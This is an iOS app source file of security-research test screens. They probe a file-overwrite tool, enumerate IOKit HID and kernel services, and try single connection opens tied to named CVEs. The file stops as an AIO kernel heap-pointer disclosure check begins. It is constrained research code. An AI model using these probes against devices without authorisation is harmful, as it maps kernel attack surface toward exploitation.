#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>


@interface ContainerChangeController : UIViewController
@property(nonatomic,strong) UITextView *details;
@property(nonatomic,strong) UILabel *colorDisplay;
@end
@implementation ContainerChangeController
- (NSURL *)targetURL {
    NSURL *documents = [[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] firstObject];
    return [documents URLByAppendingPathComponent:@"erosion-color-test.txt" isDirectory:NO];
}
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"File Change Test";
    self.view.backgroundColor = UIColor.systemBackgroundColor;
    UILabel *intro = [UILabel new];
    intro.translatesAutoresizingMaskIntoConstraints = NO;
    intro.numberOfLines = 0;
    intro.text = @"This app reads a text file in its own Documents folder. Replace that file with Erosion, then tap Reload. Expected values: RED, GREEN, or BLUE.";
    [self.view addSubview:intro];
    self.colorDisplay = [UILabel new];
    self.colorDisplay.translatesAutoresizingMaskIntoConstraints = NO;
    self.colorDisplay.font = [UIFont boldSystemFontOfSize:30];
    self.colorDisplay.textAlignment = NSTextAlignmentCenter;
    self.colorDisplay.layer.cornerRadius = 14;
    self.colorDisplay.clipsToBounds = YES;
    [self.view addSubview:self.colorDisplay];
    UIButton *reload = [UIButton buttonWithType:UIButtonTypeSystem];
    reload.translatesAutoresizingMaskIntoConstraints = NO;
    [reload setTitle:@"Reload file" forState:UIControlStateNormal];
    [reload addTarget:self action:@selector(reloadFile:) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:reload];
    UIButton *copy = [UIButton buttonWithType:UIButtonTypeSystem];
    copy.translatesAutoresizingMaskIntoConstraints = NO;
    [copy setTitle:@"Copy file path" forState:UIControlStateNormal];
    [copy addTarget:self action:@selector(copyPath:) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:copy];
    self.details = [UITextView new];
    self.details.translatesAutoresizingMaskIntoConstraints = NO;
    self.details.editable = NO;
    self.details.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    [self.view addSubview:self.details];
    UILayoutGuide *g = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [intro.topAnchor constraintEqualToAnchor:g.topAnchor constant:16],
        [intro.leadingAnchor constraintEqualToAnchor:g.leadingAnchor constant:16],
        [intro.trailingAnchor constraintEqualToAnchor:g.trailingAnchor constant:-16],
        [self.colorDisplay.topAnchor constraintEqualToAnchor:intro.bottomAnchor constant:20],
        [self.colorDisplay.leadingAnchor constraintEqualToAnchor:intro.leadingAnchor],
        [self.colorDisplay.trailingAnchor constraintEqualToAnchor:intro.trailingAnchor],
        [self.colorDisplay.heightAnchor constraintEqualToConstant:110],
        [reload.topAnchor constraintEqualToAnchor:self.colorDisplay.bottomAnchor constant:15],
        [reload.leadingAnchor constraintEqualToAnchor:intro.leadingAnchor],
        [copy.centerYAnchor constraintEqualToAnchor:reload.centerYAnchor],
        [copy.trailingAnchor constraintEqualToAnchor:intro.trailingAnchor],
        [self.details.topAnchor constraintEqualToAnchor:reload.bottomAnchor constant:8],
        [self.details.leadingAnchor constraintEqualToAnchor:intro.leadingAnchor],
        [self.details.trailingAnchor constraintEqualToAnchor:intro.trailingAnchor],
        [self.details.bottomAnchor constraintEqualToAnchor:g.bottomAnchor constant:-10]
    ]];
    NSURL *url = [self targetURL];
    if (![[NSFileManager defaultManager] fileExistsAtPath:url.path]) {
        NSError *writeError = nil;
        [@"BLUE\n" writeToURL:url atomically:YES encoding:NSUTF8StringEncoding error:&writeError];
        if (writeError) self.details.text = [NSString stringWithFormat:@"Initial file creation failed: %@",writeError];
    }
    [self reloadFile:nil];
}
- (void)copyPath:(id)sender {
    [UIPasteboard generalPasteboard].string = [self targetURL].path;
}
- (void)reloadFile:(id)sender {
    NSURL *url = [self targetURL];
    NSError *error = nil;
    NSString *content = [NSString stringWithContentsOfURL:url encoding:NSUTF8StringEncoding error:&error];
    NSString *value = [[content ?: @"" stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] uppercaseString];
    NSDictionary *colors = @{@"RED":UIColor.systemRedColor, @"GREEN":UIColor.systemGreenColor, @"BLUE":UIColor.systemBlueColor};
    UIColor *color = colors[value];
    self.colorDisplay.backgroundColor = color ?: UIColor.secondarySystemBackgroundColor;
    self.colorDisplay.textColor = color ? UIColor.whiteColor : UIColor.labelColor;
    self.colorDisplay.text = color ? value : @"INVALID / MISSING";
    self.details.text = [NSString stringWithFormat:
       @"File path:\n%@\n\nRaw content:\n%@\n\nRead error:\n%@\n\nUse Erosion File Operations → grant access to this file → import a plain text file containing GREEN or RED → overwrite → return and tap Reload.\n\nNo files outside this app are touched by the test.",
       url.path, content ?: @"(none)", error.localizedDescription ?: @"none"];
}
@end



/*
 * IOHIDFamily reachability check
 *
 * Based on the public IOHIDFamily connection type
 * kIOHIDLibUserClientConnectManager = 0x00484944 ("HID").
 * This checks only ordinary service discovery and connection creation.
 * No external selectors, IOConnectCall*, malformed buffers or racing.
 */
typedef NS_ENUM(NSInteger, HIDTestMode) {
    HIDTestModeServices = 0,
    HIDTestModeInventory = 1,
    HIDTestModeManagerClasses = 2,
    HIDTestModeFastPath = 3
};

@interface HIDReachabilityController : UIViewController
@property(nonatomic,strong) UITextView *output;
@property(nonatomic,strong) UIButton *runButton;
@property(nonatomic,strong) UIButton *inventoryButton;
@property(nonatomic,strong) UIButton *classCheckButton;
@property(nonatomic,strong) UIButton *fastPathButton;
@property(nonatomic,copy) NSString *lastLog;
@property(nonatomic,assign) HIDTestMode testMode;
- (instancetype)initWithTestMode:(HIDTestMode)mode;
@end

@implementation HIDReachabilityController
- (instancetype)initWithTestMode:(HIDTestMode)mode {
    self = [super initWithNibName:nil bundle:nil];
    if (self) _testMode = mode;
    return self;
}
- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.systemBackgroundColor;

    NSString *descriptionText = nil;
    NSString *buttonText = nil;
    SEL action = NULL;
    switch (self.testMode) {
        case HIDTestModeServices:
            self.title = @"HID Services";
            buttonText = @"Check service reachability once";
            descriptionText = @"Checks registered IOHID families and at most one normal HID manager connection. No external selectors.";
            action = @selector(runCheck:);
            break;
        case HIDTestModeInventory:
            self.title = @"HID Provider Inventory";
            buttonText = @"Inventory providers";
            descriptionText = @"Read-only registry enumeration of HID providers. No connections are opened.";
            action = @selector(inventoryProviders:);
            break;
        case HIDTestModeManagerClasses:
            self.title = @"HID Manager Classes";
            buttonText = @"Check 3 other manager classes";
            descriptionText = @"One standard manager-type open per representative HID device class. Earlier denied AppleSPUHIDDevice is skipped.";
            action = @selector(checkOtherHIDClasses:);
            break;
        case HIDTestModeFastPath:
            self.title = @"FastPath Type 2";
            buttonText = @"Check AOPTouch type 2 once";
            descriptionText = @"Tests a single AOPTouchHIDDriver type-2 open and closes it immediately. No selectors, memory writes or races. An open is NOT an exploit.";
            action = @selector(checkFastPathOnce:);
            break;
    }

    UILabel *description = [UILabel new];
    description.translatesAutoresizingMaskIntoConstraints = NO;
    description.numberOfLines = 0;
    description.font = [UIFont preferredFontForTextStyle:UIFontTextStyleSubheadline];
    description.text = descriptionText;

    UIButton *startButton = [UIButton buttonWithType:UIButtonTypeSystem];
    startButton.translatesAutoresizingMaskIntoConstraints = NO;
    [startButton setTitle:buttonText forState:UIControlStateNormal];
    [startButton addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
    switch (self.testMode) {
        case HIDTestModeServices: self.runButton = startButton; break;
        case HIDTestModeInventory: self.inventoryButton = startButton; break;
        case HIDTestModeManagerClasses: self.classCheckButton = startButton; break;
        case HIDTestModeFastPath: self.fastPathButton = startButton; break;
    }

    UIButton *copyButton = [UIButton buttonWithType:UIButtonTypeSystem];
    copyButton.translatesAutoresizingMaskIntoConstraints = NO;
    [copyButton setTitle:@"Copy results" forState:UIControlStateNormal];
    [copyButton addTarget:self action:@selector(copyLog:) forControlEvents:UIControlEventTouchUpInside];

    self.output = [UITextView new];
    self.output.translatesAutoresizingMaskIntoConstraints = NO;
    self.output.editable = NO;
    self.output.selectable = YES;
    self.output.backgroundColor = UIColor.secondarySystemBackgroundColor;
    self.output.layer.cornerRadius = 10;
    self.output.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    self.output.text = @"Not run on this page. Existing on-device results are already documented. Do not repeat a test unless there is a specific reason.";

    [self.view addSubview:description];
    [self.view addSubview:startButton];
    [self.view addSubview:copyButton];
    [self.view addSubview:self.output];
    UILayoutGuide *guide = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [description.topAnchor constraintEqualToAnchor:guide.topAnchor constant:16],
        [description.leadingAnchor constraintEqualToAnchor:guide.leadingAnchor constant:16],
        [description.trailingAnchor constraintEqualToAnchor:guide.trailingAnchor constant:-16],
        [startButton.topAnchor constraintEqualToAnchor:description.bottomAnchor constant:16],
        [startButton.leadingAnchor constraintEqualToAnchor:description.leadingAnchor],
        [copyButton.centerYAnchor constraintEqualToAnchor:startButton.centerYAnchor],
        [copyButton.trailingAnchor constraintEqualToAnchor:description.trailingAnchor],
        [self.output.topAnchor constraintEqualToAnchor:startButton.bottomAnchor constant:12],
        [self.output.leadingAnchor constraintEqualToAnchor:description.leadingAnchor],
        [self.output.trailingAnchor constraintEqualToAnchor:description.trailingAnchor],
        [self.output.bottomAnchor constraintEqualToAnchor:guide.bottomAnchor constant:-12]
    ]];
}

- (void)copyLog:(id)sender {
    [UIPasteboard generalPasteboard].string = self.lastLog ?: self.output.text;
}

/*
 * Enumerates registered service classes only. There is no IOServiceOpen,
 * IOConnectCall, HID report, shared memory access or repeated selector use.
 */
- (void)inventoryProviders:(id)sender {
    self.runButton.enabled = NO;
    self.inventoryButton.enabled = NO;
    self.output.text = @"Enumerating registered HID providers (read-only)...";
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableString *log = [NSMutableString new];
        [log appendFormat:@"HID Provider Inventory v1\nTimestamp (UTC): %@\nOS: %@\n\n",
            [NSDate date], UIDevice.currentDevice.systemVersion];
        for (NSString *family in @[@"IOHIDDevice", @"IOHIDEventService", @"IOHIDSystem"]) {
            io_iterator_t iterator = IO_OBJECT_NULL;
            kern_return_t result = IOServiceGetMatchingServices(
                kIOMainPortDefault, IOServiceMatching(family.UTF8String), &iterator);
            [log appendFormat:@"%@ | enumeration=0x%08x (%d)\n",
                family, (unsigned int)result, (int)result];
            if (result != KERN_SUCCESS || iterator == IO_OBJECT_NULL) {
                if (iterator != IO_OBJECT_NULL) IOObjectRelease(iterator);
                continue;
            }
            NSMutableDictionary<NSString *, NSNumber *> *counts = [NSMutableDictionary new];
            NSUInteger seen = 0;
            const NSUInteger maxProviders = 64;
            io_service_t entry = IO_OBJECT_NULL;
            while (seen < maxProviders && (entry = IOIteratorNext(iterator)) != IO_OBJECT_NULL) {
                io_name_t rawClass = {0};
                kern_return_t classResult = IOObjectGetClass(entry, rawClass);
                NSString *concrete = classResult == KERN_SUCCESS ?
                    [NSString stringWithUTF8String:rawClass] : @"CLASS_UNAVAILABLE";
                if (concrete.length == 0) concrete = @"CLASS_UNAVAILABLE";
                counts[concrete] = @([counts[concrete] unsignedIntegerValue] + 1);
                seen++;
                IOObjectRelease(entry);
            }
            IOObjectRelease(iterator);
            [log appendFormat:@"Observed: %lu (max %lu); concrete classes: %lu\n",
                (unsigned long)seen, (unsigned long)maxProviders, (unsigned long)counts.count];
            NSArray<NSString *> *names =
                [[counts allKeys] sortedArrayUsingSelector:@selector(compare:)];
            for (NSString *name in names) {
                [log appendFormat:@"  %@ | count=%@\n", name, counts[name]];
            }
            if (seen == maxProviders)
                [log appendString:@"  LIMIT REACHED; more providers may exist\n"];
            [log appendString:@"\n"];
        }
        [log appendString:@"Registry enumeration only: zero connection attempts, external selectors or HID reports.\nCVE-2026-112515 is not confirmed to involve these providers.\n"];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.lastLog = [log copy];
            self.output.text = self.lastLog;
            self.runButton.enabled = YES;
            self.inventoryButton.enabled = YES;
        });
    });
}


/*
 * Class-specific access check based on observed 23E261 inventory.
 *
 * The earlier probe already found a denied AppleSPUHIDDevice connection.
 * Do not repeat that probe. Enumerate at most 64 IOHIDDevice providers
 * and attempt one documented-type IOServiceOpen for the first match of
 * each of the three remaining concrete classes. Close immediately.
 * No IOConnectCall*, HID reports, shared memory, or racing.
 */
- (void)checkOtherHIDClasses:(id)sender {
    self.runButton.enabled = NO;
    self.inventoryButton.enabled = NO;
    self.classCheckButton.enabled = NO;  // one-shot per screen instance
    self.output.text = @"Checking three other HID device classes once...";
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSArray<NSString *> *targets = @[
            @"AppleHIDTransportHIDDevice",
            @"AppleWirelessChargingDevice",
            @"IOHIDUserDevice"
        ];
        NSMutableSet<NSString *> *completed = [NSMutableSet new];
        NSMutableString *log = [NSMutableString new];
        [log appendFormat:@"HID Class Access v2\nTimestamp (UTC): %@\nOS: %@\nBundle: %@\n\n",
             [NSDate date], UIDevice.currentDevice.systemVersion,
             NSBundle.mainBundle.bundleIdentifier ?: @"unknown"];
        [log appendString:@"AppleSPUHIDDevice | SKIPPED (previously denied 0xe00002e2)\n"];
        io_iterator_t iterator = IO_OBJECT_NULL;
        kern_return_t matchResult = IOServiceGetMatchingServices(
            kIOMainPortDefault, IOServiceMatching("IOHIDDevice"), &iterator);
        [log appendFormat:@"IOHIDDevice | enumeration=0x%08x\n", (unsigned int)matchResult];

        if (matchResult == KERN_SUCCESS && iterator != IO_OBJECT_NULL) {
            const NSUInteger maxVisited = 64;
            NSUInteger visited = 0;
            io_service_t entry = IO_OBJECT_NULL;
            while (visited < maxVisited && completed.count < targets.count &&
                   (entry = IOIteratorNext(iterator)) != IO_OBJECT_NULL) {
                visited++;
                io_name_t className = {0};
                kern_return_t classResult = IOObjectGetClass(entry, className);
                NSString *name = classResult == KERN_SUCCESS ?
                    [NSString stringWithUTF8String:className] : nil;
                if (name != nil && [targets containsObject:name] &&
                    ![completed containsObject:name]) {
                    [completed addObject:name];
                    io_connect_t connection = IO_OBJECT_NULL;
                    const uint32_t type = 0x00484944u;
                    kern_return_t result = IOServiceOpen(
                        entry, mach_task_self(), type, &connection);
                    [log appendFormat:@"%@ | type=0x%08x | open=0x%08x (%d)\n",
                         name, type, (unsigned int)result, (int)result];
                    if (connection != IO_OBJECT_NULL) IOServiceClose(connection);
                }
                IOObjectRelease(entry);
            }
            [log appendFormat:@"Visited: %lu (limit %lu)\n",
                 (unsigned long)visited, (unsigned long)maxVisited];
        }
        if (iterator != IO_OBJECT_NULL) IOObjectRelease(iterator);

        for (NSString *name in targets) {
            if (![completed containsObject:name]) {
                [log appendFormat:@"%@ | open=NOT_ATTEMPTED (no matched provider within bound)\n", name];
            }
        }
        [log appendString:@"\nExactly one normal connection attempt per matched target class; successful connections immediately closed. No external selectors, HID reports, shared memory or racing.\nConnection success is NOT proof of CVE-2026-112515, kernel access, or injection.\n"];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.lastLog = [log copy];
            self.output.text = self.lastLog;
            self.runButton.enabled = YES;
            self.inventoryButton.enabled = YES;
            // Keep classCheckButton disabled: no repeated opens on this screen.
        });
    });
}


/*
 * Independent access prerequisite for the publicly documented
 * IOHIDEventServiceFastPathUserClient (CVE-2026-28992 research lead).
 * Apple's iPadOS 26.5 advisory confirms an IOHIDFamily locking fix.
 * The published third-party analysis uses IOServiceOpen(type 2).
 *
 * Absolutely no user-client selectors, entitlement dictionaries, or race
 * sequences from the public panic PoC are invoked. One service, one open
 * attempt, immediate close, and no retries in this screen instance.
 */
- (void)checkFastPathOnce:(id)sender {
    self.runButton.enabled = NO;
    self.inventoryButton.enabled = NO;
    self.classCheckButton.enabled = NO;
    self.fastPathButton.enabled = NO;
    self.output.text = @"Checking one FastPath connection (no method calls)...";
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableString *log = [NSMutableString new];
        [log appendFormat:@"HID FastPath Open-Only v1\nTimestamp (UTC): %@\nOS: %@\n\n",
             [NSDate date], UIDevice.currentDevice.systemVersion];
        io_iterator_t iterator = IO_OBJECT_NULL;
        kern_return_t status = IOServiceGetMatchingServices(
            kIOMainPortDefault, IOServiceMatching("IOHIDEventService"), &iterator);
        [log appendFormat:@"IOHIDEventService | enumeration=0x%08x\n", (unsigned int)status];
        BOOL found = NO;
        if (status == KERN_SUCCESS && iterator != IO_OBJECT_NULL) {
            io_service_t service = IO_OBJECT_NULL;
            NSUInteger seen = 0;
            while (seen < 64 && (service = IOIteratorNext(iterator)) != IO_OBJECT_NULL) {
                seen++;
                io_name_t raw = {0};
                kern_return_t cls = IOObjectGetClass(service, raw);
                NSString *name = cls == KERN_SUCCESS ?
                    [NSString stringWithUTF8String:raw] : nil;
                if ([name isEqualToString:@"AOPTouchHIDDriver"]) {
                    found = YES;
                    io_connect_t connection = IO_OBJECT_NULL;
                    const uint32_t fastPathType = 2u;
                    kern_return_t result = IOServiceOpen(
                        service, mach_task_self(), fastPathType, &connection);
                    [log appendFormat:@"%@ | type=%u | open=0x%08x (%d)\n",
                         name, fastPathType, (unsigned int)result, (int)result];
                    if (connection != IO_OBJECT_NULL) IOServiceClose(connection);
                    IOObjectRelease(service);
                    break;
                }
                IOObjectRelease(service);
            }
            [log appendFormat:@"Visited: %lu (limit 64)\n", (unsigned long)seen];
        }
        if (iterator != IO_OBJECT_NULL) IOObjectRelease(iterator);
        if (!found) [log appendString:@"AOPTouchHIDDriver | NOT_FOUND_WITHIN_LIMIT | open=NOT_ATTEMPTED\n"];
        [log appendString:@"\nOne ordinary connection attempt at most; immediate close. ZERO external selectors, reports, gate inputs, race iterations, or thread churn.\nCVE-2026-28992's published PoCs are crash/panic demos, NOT controlled kernel read/write; they were NOT reproduced.\nA successful open proves only reachability, not vulnerability or exploitability.\n"];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.lastLog = [log copy];
            self.output.text = self.lastLog;
            self.runButton.enabled = YES;
            self.inventoryButton.enabled = YES;
            self.classCheckButton.enabled = YES;
            // fastPathButton intentionally remains disabled: no repeats.
        });
    });
}

- (void)runCheck:(id)sender {
    self.runButton.enabled = NO;
    self.inventoryButton.enabled = NO;
    self.output.text = @"Checking IOHIDFamily service registration...";
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableString *log = [NSMutableString new];
        [log appendFormat:@"HID Reachability v1\nTimestamp (UTC): %@\nOS: %@\nBundle: %@\n\n",
         [NSDate date], UIDevice.currentDevice.systemVersion,
         NSBundle.mainBundle.bundleIdentifier ?: @"unknown"];

        NSArray<NSString *> *classes = @[@"IOHIDDevice", @"IOHIDEventService", @"IOHIDSystem"];
        for (NSString *name in classes) {
            io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
                                           IOServiceMatching(name.UTF8String));
            if (service == IO_OBJECT_NULL) {
                [log appendFormat:@"%@ | match=NOT_FOUND | open=NOT_ATTEMPTED\n", name];
                continue;
            }

            io_name_t concreteClass = {0};
            kern_return_t classStatus = IOObjectGetClass(service, concreteClass);
            [log appendFormat:@"%@ | match=FOUND | concrete=%@",
                name, classStatus == KERN_SUCCESS ?
                [NSString stringWithUTF8String:concreteClass] : @"UNAVAILABLE"];

            if ([name isEqualToString:@"IOHIDDevice"]) {
                // Apple IOHIDFamily's published HID manager connection type.
                // Open the first matching service only; close it immediately.
                const uint32_t hidConnectionType = 0x00484944u;
                io_connect_t connection = IO_OBJECT_NULL;
                kern_return_t result = IOServiceOpen(service, mach_task_self(),
                                                       hidConnectionType, &connection);
                [log appendFormat:@" | type=0x%08x | open=0x%08x (%d)\n",
                    hidConnectionType, (unsigned int)result, (int)result];
                if (connection != IO_OBJECT_NULL) IOServiceClose(connection);
            } else {
                [log appendString:@" | open=NOT_ATTEMPTED (discovery only)\n"];
            }
            IOObjectRelease(service);
        }

        [log appendString:@"\nCaution: IOHIDEventServiceUserClient checks a private HID entitlement in published Apple source; it is deliberately not opened here.\nNo external selectors, device reports, shared memory, or kernel-memory operations were attempted.\nAn open connection is an access prerequisite only, not proof of a kernel exploit.\n"];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.lastLog = [log copy];
            self.output.text = self.lastLog;
            self.runButton.enabled = YES;
            self.inventoryButton.enabled = YES;
        });
    });
}
@end

@interface ProbeController : UIViewController
@property(nonatomic,strong) UITextView *output;
@property(nonatomic,strong) UIButton *runButton;
@property(nonatomic,strong) NSString *lastLog;
@end

@implementation ProbeController
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"Kernel Services";
    self.view.backgroundColor = UIColor.systemBackgroundColor;

    UILabel *heading = [UILabel new];
    heading.translatesAutoresizingMaskIntoConstraints = NO;
    heading.font = [UIFont preferredFontForTextStyle:UIFontTextStyleTitle2];
    heading.text = @"AppleAVE2 access check";
    heading.numberOfLines = 0;
    [self.view addSubview:heading];

    UILabel *description = [UILabel new];
    description.translatesAutoresizingMaskIntoConstraints = NO;
    description.text = @"One normal IOServiceOpen(type 0) per service. No selector calls, memory modification, or racing. ANE is discovery-only.";
    description.font = [UIFont preferredFontForTextStyle:UIFontTextStyleSubheadline];
    description.numberOfLines = 0;
    [self.view addSubview:description];

    self.runButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.runButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.runButton setTitle:@"Run one-time checks" forState:UIControlStateNormal];
    [self.runButton addTarget:self action:@selector(runProbe:) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.runButton];

    UIButton *copyButton = [UIButton buttonWithType:UIButtonTypeSystem];
    copyButton.translatesAutoresizingMaskIntoConstraints = NO;
    [copyButton setTitle:@"Copy results" forState:UIControlStateNormal];
    [copyButton addTarget:self action:@selector(copyLog:) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:copyButton];

    self.output = [UITextView new];
    self.output.translatesAutoresizingMaskIntoConstraints = NO;
    self.output.editable = NO;
    self.output.selectable = YES;
    self.output.backgroundColor = UIColor.secondarySystemBackgroundColor;
    self.output.layer.cornerRadius = 10;
    self.output.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    self.output.text = @"Press Run to check AppleAVE2Driver and four previously measured services.\nNo checks have run yet.";
    [self.view addSubview:self.output];

    UILayoutGuide *guide = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [heading.topAnchor constraintEqualToAnchor:guide.topAnchor constant:12],
        [heading.leadingAnchor constraintEqualToAnchor:guide.leadingAnchor constant:16],
        [heading.trailingAnchor constraintEqualToAnchor:guide.trailingAnchor constant:-16],
        [description.topAnchor constraintEqualToAnchor:heading.bottomAnchor constant:10],
        [description.leadingAnchor constraintEqualToAnchor:heading.leadingAnchor],
        [description.trailingAnchor constraintEqualToAnchor:heading.trailingAnchor],
        [self.runButton.topAnchor constraintEqualToAnchor:description.bottomAnchor constant:12],
        [self.runButton.leadingAnchor constraintEqualToAnchor:heading.leadingAnchor],
        [copyButton.centerYAnchor constraintEqualToAnchor:self.runButton.centerYAnchor],
        [copyButton.trailingAnchor constraintEqualToAnchor:heading.trailingAnchor],
        [self.output.topAnchor constraintEqualToAnchor:self.runButton.bottomAnchor constant:10],
        [self.output.leadingAnchor constraintEqualToAnchor:heading.leadingAnchor],
        [self.output.trailingAnchor constraintEqualToAnchor:heading.trailingAnchor],
        [self.output.bottomAnchor constraintEqualToAnchor:guide.bottomAnchor constant:-12]
    ]];
}
- (void)copyLog:(id)sender {
    [UIPasteboard generalPasteboard].string = self.lastLog ?: self.output.text;
}
- (void)runProbe:(id)sender {
    self.runButton.enabled = NO;
    self.output.text = @"Checking...";
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableString *log = [NSMutableString new];
        [log appendFormat:@"Kernel Service Probe v1\nTimestamp (UTC): %@\nOS: %@\nModel: %@\nBundle: %@\n\n",
         [NSDate date], UIDevice.currentDevice.systemVersion, UIDevice.currentDevice.model,
         NSBundle.mainBundle.bundleIdentifier ?: @"unknown"];
        NSArray<NSString *> *names = @[
           @"AppleAVE2Driver", @"IOSurfaceRoot", @"IOMobileFramebuffer",
           @"AppleMobileFileIntegrity", @"IODTNVRAM"
        ];
        for (NSString *name in names) {
            io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
                                             IOServiceMatching(name.UTF8String));
            if (service == IO_OBJECT_NULL) {
                [log appendFormat:@"%@ | match=NOT_FOUND | open=NOT_ATTEMPTED\n", name];
                continue;
            }
            [log appendFormat:@"%@ | match=FOUND",name];
            io_connect_t connection = IO_OBJECT_NULL;
            kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
            [log appendFormat:@" | type=0 | open=0x%08x (%d)\n", (unsigned int)kr, (int)kr];
            if (connection != IO_OBJECT_NULL) IOServiceClose(connection);
            IOObjectRelease(service);
        }
        [log appendString:@"\nANE discovery only (NO open):\n"];
        for (NSString *name in @[@"ANEHWDevice"]) {
            io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
                                            IOServiceMatching(name.UTF8String));
            [log appendFormat:@"%@ | match=%@\n", name,
                service == IO_OBJECT_NULL ? @"NOT_FOUND" : @"FOUND"];
            if (service != IO_OBJECT_NULL) IOObjectRelease(service);
        }
        [log appendString:@"\nInterpretation: opening a service is NOT a kernel exploit or process injection. NOT_FOUND may mean a different registration class, not absence of the driver.\n"];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.lastLog = [log copy];
            self.output.text = self.lastLog;
            self.runButton.enabled = YES;
        });
    });
}
@end



/*
 * CVE-2026-84530 AIO/kqueue metadata disclosure, one-shot read-only check.
 * Original research: vschko/CaseStudies/CVE-2026-84530.
 * This creates only an app-owned FIFO and asks for metadata on THIS process's
 * kqueue. It does not invoke malformed selectors, races or kernel writes.
 * A high address in the AIO saved-data field is evidence of the disclosure;
 * absence is a meaningful negative, not a reason to repeat crash tests.
 */
#import <aio.h>
#import <sys/event.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <dlfcn.h>
#include <stdlib.h>
#include <stdint.h>
#ifndef SIGEV_KEVENT
#define SIGEV_KEVENT 4
#endif

struct ProbeAIOEvent {
    uint64_t ident; int16_t filter; uint16_t flags; int32_t qos;
    uint64_t udata; uint32_t fflags, xflags; int64_t data; uint64_t ext[4];
};
struct ProbeAIOExtInfo {
    struct ProbeAIOEvent event;
    uint64_t savedData;
    int32_t status, savedFlags;
    uint64_t reserved[2];
};
typedef int (*ProbePidFdInfo)(int, int, int, void *, int);

@interface AIODisclosureController : UIViewController
@property(nonatomic,strong) UITextView *logView;
@property(nonatomic,strong) UIButton *runButton;
@end
@implementation AIODisclosureController
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"AIO Kernel Heap Pointer";
    self.view.backgroundColor = UIColor.systemBackgroundColor;
    UILabel *message = [UILabel new];
    message.translatesAutoresizingMaskIntoConstraints = NO;
    message.numberOfLines = 0;
    message.font = [UIFont preferredFontForTextStyle:UIFontTextStyleSubheadline];
    message.text = @"CVE-2026-84530: reads this process's AIO kqueue "
      "metadata to check for a leaked aio_workq_entry heap pointer. "
      "The pointer is NOT the kernel image base or a code-execution primitive. "
      "A result must have ordinary event data equal to zero.";
    self.runButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.runButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.runButton setTitle:@"Run AIO metadata test once"
                    forState:UIControlStateNormal];
    [self.runButton addTarget:self action:@selector(runOnce:)
             forControlEvents:UIControlEventTouchUpInside];
    UIButton *copy = [UIButton buttonWithType:UIButtonTypeSystem];
    copy.translatesAutoresizingMaskIntoConstraints = NO;
    [copy setTitle:@"Copy results" forState:UIControlStateNormal];
    [copy addTarget:self action:@selector(copyResults:)
    forControlEvents:UIControlEventTouchUpInside];
    self.logView = [UITextView new];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.editable = NO;
    self.logView.selectable = YES;
    self.logView.backgroundColor = UIColor.secondarySystemBackgroundColor;
    self.logView.layer.cornerRadius = 10;
    self.logView.font = [UIFont monospacedSystemFontOfSize:12
                                             weight:UIFontWeightRegular];
    self.logView.text = @"Not run. Operates on one app-owned FIFO and this process only.";
    [self.view addSubview:message];
    [self.view addSubview:self.runButton];
    [self.view addSubview:copy];
    [self.view addSubview:self.logView];
    UILayoutGuide *g = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
      [message.topAnchor constraintEqualToAnchor:g.topAnchor constant:12],
      [message.leadingAnchor constraintEqualToAnchor:g.leadingAnchor constant:16],
      [message.trailingAnchor constraintEqualToAnchor:g.trailingAnchor constant:-16],
      [self.runButton.topAnchor constraintEqualToAnchor:message.bottomAnchor constant:18],
      [self.runButton.leadingAnchor constraintEqualToAnchor:message.leadingAnchor],
      [copy.centerYAnchor constraintEqualToAnchor:self.runButton.centerYAnchor],
      [copy.trailingAnchor constraintEqualToAnchor:message.trailingAnchor],
      [self.logView.topAnchor constraintEqualToAnchor:self.runButton.bottomAnchor constant:12],
      [self.logView.leadingAnchor constraintEqualToAnchor:message.leadingAnchor],
      [self.logView.trailingAnchor constraintEqualToAnchor:message.trailingAnchor],
      [self.logView.bottomAnchor constraintEqualToAnchor:g.bottomAnchor constant:-12]
    ]];
}
- (void)copyResults:(id)sender {
    UIPasteboard.generalPasteboard.string = self.logView.text ?: @"";
}
- (void)runOnce:(id)sender {
    if (!self.runButton.enabled) return;
